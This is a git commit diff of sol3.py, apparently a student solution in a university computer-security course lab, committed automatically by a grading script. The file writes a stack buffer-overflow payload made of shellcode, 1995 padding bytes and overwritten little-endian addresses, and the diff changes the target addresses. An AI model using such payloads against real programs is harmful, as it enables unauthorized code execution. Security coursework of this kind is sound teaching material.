9dac50c9c2407d7d64bb695af47f27334bd1fa3c
eecs388 <eecs388@eecs388.escher.lan>
2022-03-28 15:17:12 +0000

    Automatic commit by test script for rsgao yfenghua

--- sol3.py
+++ sol3.py
@@ -1,3 +1,3 @@
 from shellcode import shellcode
 import sys
-sys.stdout.buffer.write(shellcode + b'A'*1995 +0x08048c80.to_bytes(4,"little") + 0xfff6f0c8.to_bytes(4,"little"))
+sys.stdout.buffer.write(shellcode + b'A'*1995 + 0xfff6f0c8.to_bytes(4,"little") + 0xfff6f8dc.to_bytes(4,"little") )
